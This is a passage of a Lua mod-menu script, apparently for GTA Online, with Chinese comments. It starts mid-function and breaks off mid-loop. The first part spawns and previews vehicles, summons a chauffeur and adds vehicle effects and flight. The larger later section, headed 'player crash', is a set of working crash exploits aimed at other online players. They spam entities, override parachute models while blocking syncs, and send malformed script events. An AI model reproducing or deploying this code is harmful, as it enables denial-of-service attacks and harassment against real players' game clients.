                    Vspawn(valiases_spawn.veh, tar1, targets, tostring(players.get_name(pid)))
                    else
                        if set.alert then
                            util.toast('未设置车辆生成')
                        end
                         
                end
        end, nil, nil, COMMANDPERM_SPAWN)

        menu.on_focus(alias_menu_item, function ()
            local hash = util.joaat(vehicle)
            Streament(hash)
            local handle = entities.create_vehicle(hash, {x=0, y=0, z=0}, 0)
            if handle then
                ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(handle , false, true)
                ENTITY.SET_ENTITY_ALPHA(handle , 206, false)
                ENTITY.FREEZE_ENTITY_POSITION(handle, true)
                current_preview = {
                    handle = handle,
                    position={x=0,y=0,z=0},
                    rotation={x=0,y=0,z=0},
                    camera_distance=5}
            end
        end)
        menu.on_blur(alias_menu_item, function()
          entities.delete_by_handle(current_preview.handle)
          current_preview = nil
        end)
      end
      util.create_tick_handler(function ()
        if current_preview ~= nil then
          update_preview_tick()
        end
    end)
end

function Vspawn(mod, pCoor, pedSi, plate)
    Streament(mod)
   local vmod = VEHICLE.CREATE_VEHICLE(mod, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
    PED.SET_PED_INTO_VEHICLE(pedSi, vmod, -1)
    VEHICLE.SET_VEHICLE_COLOURS(vmod, math.random(0, 160), math.random(0, 160))
    Vmod(vmod, plate)
    local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
    ENTITY.SET_ENTITY_HEADING(vmod, CV)
end

function get_vehicle_model_info(modelHash)
	return util.call_foreign_function(GetVehicleModelInfo, modelHash, NULL)
end

function get_vehicle_model_handling_data(modelInfo)
	return util.call_foreign_function(GetHandlingDataFromIndex, memory.read_uint(modelInfo + 0x4B8))
end

local taxi_ped = 0
local taxi_veh = 0
local taxi_blip = -1

function summ_car(index, value)
    
    local vhash = util.joaat(value)
    local phash = util.joaat("s_m_y_casino_01")

    if taxi_veh ~= 0 then
        entities.delete_by_handle(taxi_veh)
    end

    if taxi_ped ~= 0 then
        util.remove_blip(taxi_blip)
        entities.delete_by_handle(taxi_ped)
    end 

    local plyr = players.user_ped()
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 5.0, 0.0)
    request_model_load(vhash)
    request_model_load(phash)
    taxi_veh = entities.create_vehicle(vhash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
    max_out_car(taxi_veh)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(taxi_veh, "LANCE")
    VEHICLE.SET_VEHICLE_COLOURS(taxi_veh, 145, 145)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_veh, true)
    --local my_rel_hash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(players.user_ped())
    taxi_ped = entities.create_ped(32, phash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(taxi_ped, util.joaat("rgFM_AiLike"))
    taxi_blip = HUD.ADD_BLIP_FOR_ENTITY(taxi_ped)
    HUD.SET_BLIP_COLOUR(taxi_blip, 7)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_ped, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(taxi_ped, true)
    PED.SET_PED_FLEE_ATTRIBUTES(taxi_ped, 0, false)
    PED.SET_PED_CAN_BE_DRAGGED_OUT(taxi_ped, false)
    VEHICLE.SET_VEHICLE_EXCLUSIVE_DRIVER(taxi_veh, taxi_ped, -1)
    PED.SET_PED_INTO_VEHICLE(taxi_ped, taxi_veh, -1)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_ped, true)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(), taxi_veh, 0)
    notification("您的司机已创建！", colors.blue)
end

function summ_car_topoint()
    if taxi_ped == 0 then
        notification("你没有生成司机.")
    else
        local goto_coords = get_waypoint_coords()
        if goto_coords ~= nil then
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(taxi_ped, taxi_veh, goto_coords['x'], goto_coords['y'], goto_coords['z'], 300.0, 786996, 5)
        end
    end
end

function summ_car_tp()
    if taxi_ped == 0 then
        notification("你没有生成司机.", colors.blue)
    else
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), taxi_veh, 0)
    end
end

function summ_car_bmob()
    if taxi_ped == 0 then
        notification("你没有生成司机.", colors.blue)
    else
        local ped_copy = taxi_ped
        local veh_copy = taxi_veh
        taxi_ped = 0
        taxi_veh = 0
        local coords = ENTITY.GET_ENTITY_COORDS(veh_copy)
        ENTITY.SET_ENTITY_INVINCIBLE(veh_copy, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 100.0, true, false, 1.0)
        ENTITY.SET_ENTITY_HEALTH(veh_copy, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(ped_copy, false)
        ENTITY.SET_ENTITY_HEALTH(ped_copy, 0)
        if math.random(5) == 3 then
            notification("他有老婆孩子...", colors.blue)
        end
        util.yield(3000)
        entities.delete_by_handle(ped_copy)
        entities.delete_by_handle(veh_copy)
    end
end

local careffects = {
	{"scr_rcbarry1", "scr_alien_impact_bul", 1.0, 50},
	{"scr_rcbarry2", "scr_clown_appears", 0.3, 500},
	{"core", "ent_dst_elec_fire_sp", 1.0, 100},
	{"scr_rcbarry1", "scr_alien_disintegrate", 0.1, 400},
    {"scr_rcbarry2", "scr_exp_clown", 0.1, 400},
	{"scr_rcbarry1", "scr_alien_teleport", 0.1, 400}
}
local careffects_lastEffect = newTimer()

function cargoodeffect()
    local effects = careffects[selectedOpt]
	local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

	if ENTITY.DOES_ENTITY_EXIST(vehicle) and not ENTITY.IS_ENTITY_DEAD(vehicle, false) and
	VEHICLE.IS_VEHICLE_DRIVEABLE(vehicle, false) and careffects_lastEffect.elapsed() > effects[4] then
		request_fx_asset(effects[1])
		for _, boneName in pairs({"wheel_lf", "wheel_lr", "wheel_rf", "wheel_rr"}) do
			local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicle, boneName)
			GRAPHICS.USE_PARTICLE_FX_ASSET(effects[1])
			GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
				effects[2],
				vehicle,
				-0.05, 0.0, 0.0,
				0.0, 0.0, 0.0,
				bone,
				effects[3],
				false, false, false
			)
		end
		careffects_lastEffect.reset()
	end
end

function set_carvis(index)
    selectedOpt = index
end


speed = 6
function do_vehicle_fly() 
    veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0);
    ENTITY.SET_ENTITY_ROTATION(veh, cam_pos.x, cam_pos.y, cam_pos.z, 1, TRUE);
    ENTITY.SET_ENTITY_COLLISION(veh, not no_collision, TRUE);
    
    local locspeed = speed*10
    local locspeed2 = speed
    if PAD.IS_CONTROL_PRESSED(0, 61) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end

    
    if PAD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PAD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed * 2
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
   end
    if PAD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
	end
    if PAD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed*2
        end
        if dont_stop then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end



------------------------------------
-------------玩家崩溃---------------
------------------------------------

--奥特曼崩V1
function aotemanv1(PlayerID)
	local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = { }
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_TWO"),TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(1)
    end
    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
    end
end

--奥特曼崩V2
function aotemanv2(PlayerID)
local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = { }
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_ZERO"),TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(1)
    end
    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
    end
end

--奥特曼崩V3
function aotemanv3(PlayerID)
local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = { }
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_ONE"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(1)
    end
    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
    end
end

---因莎拉崩溃
function inshellcrash(PlayerID)
    local TargetPPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
    local PED1  = CreatePed(28,-1011537562,TargetPPos,0)
    local PED2  = CreatePed(28,-541762431,TargetPPos,0)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)
    WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)
    util.yield(1000)
    TASK.TASK_THROW_PROJECTILE(PED1,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
    TASK.TASK_THROW_PROJECTILE(PED2,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)
    notification("Finished.",colors.red)
end

--for 大自然崩溃v1 v2 泡泡糖崩溃 绿玩保护崩溃
local function BlockSyncs(PlayerID, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= PlayerID then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= PlayerID then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

--大自然崩溃
function naturecrashv1(PlayerID)
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(PlayerID, function()
        util.yield(100)
        menu.trigger_commands("invisibility on")
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            util.yield(50)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        util.yield(250)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        menu.trigger_commands("invisibility off")
    end)
end

---大自然崩溃 v2
function naturecrashv2(PlayerID)
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(PlayerID, function() 
        util.yield(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        util.yield()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        util.yield(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
    end)
end

function greifcrash(PlayerID)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local pos = players.get_position(PlayerID)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(PlayerID) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				util.yield(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				util.yield(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end

function sugercrash(PlayerID)
    local mdl = util.joaat("apa_mp_apa_yacht")
    local user = players.user_ped()
    BlockSyncs(PlayerID, function()
    util.yield(250)
    local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
    PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
    PLAYER.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
    util.yield(50)
    local pos = players.get_position(PlayerID)
    pos.z += 300
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
    repeat
        util.yield()
    until PED.GET_PED_PARACHUTE_STATE(user) == 0
    PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    util.yield(50)
    TASK.CLEAR_PED_TASKS(user)
    util.yield(50)
    PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
    repeat
        util.yield()
    until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
    pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
    PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos.x, old_pos.y, old_pos.z, false, false)
    end)
end

--crash_request_model
function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end
--绿玩保护崩溃
function cpscrash(PlayerID)
    local mdl = util.joaat('a_c_poodle')
    BlockSyncs(PlayerID, function()
        if request_model(mdl, 2) then
            local pos = players.get_position(PlayerID)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), 0, 3, 0), 0) 

           
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(1000)
        else
            util.toast("Failed to load model. :/")
        end
    end)
end
--莱纳斯崩溃
function lestcrash(PlayerID)
    local int_min = -2147483647
    local int_max = 2147483647
    for i = 1, 150 do
    util.trigger_script_event(1 << PlayerID, {2765370640, PlayerID, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
    math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
end
util.yield()
    for i = 1, 15 do
    util.trigger_script_event(1 << PlayerID, {1348481963, PlayerID, math.random(int_min, int_max)})
    end
menu.trigger_commands("givesh " .. players.get_name(PlayerID))
util.yield(100)
util.trigger_script_event(1 << PlayerID, {495813132, PlayerID, 0, 0, -12988, -99097, 0})
util.trigger_script_event(1 << PlayerID, {495813132, PlayerID, -4640169, 0, 0, 0, -36565476, -53105203})
util.trigger_script_event(1 << PlayerID, {495813132, PlayerID,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
end

--碎片崩溃
function fragmentcrash(PlayerID)
    BlockSyncs(PlayerID, function()
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        util.yield(1000)
        entities.delete_by_handle(object)
    end)
end
        ---董哥崩溃
        function dongge(PlayerID)
            util.toast("I'll try to convince them to leave :) ")
                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
                util.yield(20)
                local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
                TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
                util.yield(500)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
                util.yield(1000)
                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
                end


--美杜莎崩溃
function MDS(PlayerID)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
	local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    plauuepos.x = plauuepos.x + 5
    plauuepos.z = plauuepos.z + 5
    local hunter = {}
    for i = 1 ,3 do
        for n = 0,120 do
            hunter[n] = CreateVehicle(1077420264,plauuepos,0)
            util.yield(0)
            ENTITY.FREEZE_ENTITY_POSITION(hunter[n],true)
            util.yield(0)
            VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
        end
        util.yield(190)
        for i = 1,#hunter do
            if hunter[i] ~= nil then
                entities.delete_by_handle(hunter[i])
            end
        end
    end
    util.toast("Finished!")
	menu.trigger_commands("anticrashcam off")
    hunter = nil
    plauuepos = nil	
end
function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end

---马桶崩溃
function toiletcrash(PlayerID)
    for i = 1, 10 do
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        STREAMING.REQUEST_MODEL(-930879665)
        util.yield(10)
        STREAMING.REQUEST_MODEL(3613262246)
        util.yield(10)
        STREAMING.REQUEST_MODEL(452618762)
        util.yield(10)
        while not STREAMING.HAS_MODEL_LOADED(-930879665) do util.yield() end
        while not STREAMING.HAS_MODEL_LOADED(3613262246) do util.yield() end
        while not STREAMING.HAS_MODEL_LOADED(452618762) do util.yield() end
        local a1 = entities.create_object(-930879665, cord)
        util.yield(10)
        local a2 = entities.create_object(3613262246, cord)
        util.yield(10)
        local b1 = entities.create_object(452618762, cord)
        util.yield(10)
        local b2 = entities.create_object(3613262246, cord)
        util.yield(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
        util.yield(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
        util.yield(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
        util.yield(10)
        end
        if SE_Notifications then
            notification("Finished.",colors.red)
        end
    end

    --声音崩溃V1
    function soundcrashv1(PlayerID)
        local time = util.current_time_millis() + 2000
                while time > util.current_time_millis() do
                    local pos=ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
                    for i = 1, 10 do
                        AUDIO.PLAY_SOUND_FROM_COORD(-1,"10s",pos.x,pos.y,pos.z,"MP_MISSION_COUNTDOWN_SOUNDSET",true, 70, false)
                    end
                    util.yield(0)
                end
            end 

        --声音崩溃V2
        function soundcrashv2(PlayerID)
        local time = util.current_time_millis() + 2000
                while time > util.current_time_millis() do
                    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
                    for i = 1, 20 do
                        AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Event_Message_Purple', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                        AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                    end
                    util.yield()
                end	
            end

            ---无效模型崩溃
            function wxcrash(PlayerID)
                menu.trigger_commands("anticrashcam on")
                    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
                    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                    local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
                    local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
                    local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
                    local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
                    for i = 0, 100 do 
                        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                        util.yield(10)
                    end
                    util.yield(2000)
                    entities.delete_by_handle(Object_pizza1)
                    entities.delete_by_handle(Object_pizza2)
                    entities.delete_by_handle(Object_pizza3)
                    entities.delete_by_handle(Object_pizza4)
                    menu.trigger_commands("anticrashcam off")
                    end

                    ---5g崩溃
                    function x999gcrash(PlayerID)
                        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
                        local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
                        pos.z = pos.z + 10
                        veh = entities.get_all_vehicles_as_handles()
                        
                      for i = 1, #veh do
                      NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
                      ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
                      TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
                      TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
                      end
                  end

                  --大鸡巴崩溃
function suckmydick(PlayerID)
local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
local Object_jb1 = CreateObject(0xD75E01A6, TargetPlayerPos)
local Object_jb2 = CreateObject(0x675D244E, TargetPlayerPos)
local Object_jb3 = CreateObject(0x799B48CA, TargetPlayerPos)
local Object_jb4 = CreateObject(0x68E49D4D, TargetPlayerPos)
local Object_jb5 = CreateObject(0x66F34017, TargetPlayerPos)
local Object_jb6 = CreateObject(0xDE1807BB, TargetPlayerPos)
local Object_jb7 = CreateObject(0xC4C9551E, TargetPlayerPos)
local Object_jb8 = CreateObject(0xCF37BA1F, TargetPlayerPos)
local Object_jb9 = CreateObject(0xB69AD9F8, TargetPlayerPos)
local Object_jb10 = CreateObject(0x5D750529, TargetPlayerPos)
local Object_jb11 = CreateObject(0x1705D85C, TargetPlayerPos)
for i = 0, 1000 do 
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
